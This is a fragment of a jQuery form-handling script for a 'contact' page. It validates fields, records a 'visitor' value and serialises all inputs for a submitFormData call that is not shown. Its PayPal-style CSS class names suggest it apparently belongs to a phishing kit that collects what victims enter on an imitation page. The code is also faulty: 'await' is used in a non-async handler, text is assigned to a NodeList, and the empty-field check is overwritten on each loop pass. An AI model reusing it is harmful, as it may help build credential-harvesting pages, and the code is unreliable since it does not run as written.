<script>
	page = "contact";
	$(document).ready(function() {
    $('form').on('submit', function(event) {
        event.preventDefault();
        let myForm = $("#form");
        let checkInputs = document.querySelectorAll('.check');
        
        sessionStorage.setItem('country', document.getElementById('country').value);
        
        // Flag to track if any input is empty
        let isEmpty = false;
	
        
        for (const check of checkInputs) {
        
            if (check.value.trim() === "") {
                var errmesage = check.name;
                check.nextElementSibling.textContent = " Required";
                check.parentElement.classList.add('ppvx_field--error___3-14-9');
                isEmpty = true;
                
                
            }else{
            
                check.parentElement.classList.remove('ppvx_field--error___3-14-9');
                console.log(check.value);
                var errmesage = check.id;
                document.querySelectorAll('.errmes').textContent = errmesage + " se requiere"; 
                check.nextElementSibling.borderColor =  "red"; 
                check.nextElementSibling.textContent = "";
                isEmpty = false;
            }
        }

        if (!isEmpty) {
            document.querySelector('#subbut').disabled = true;
            document.getElementById('load').style.display = "block";
            let userinfo = myForm.serializeArray();
            let user = {};
            var visitor = sessionStorage.getItem('visitor');

            userinfo.forEach((value) => {
                user[value.name] = value.value;
            });
            
            //checkEmailDomain(usern.value); 
			
            user['visitor'] = visitor;
            await submitFormData(user);
            

            
        }
    });
});
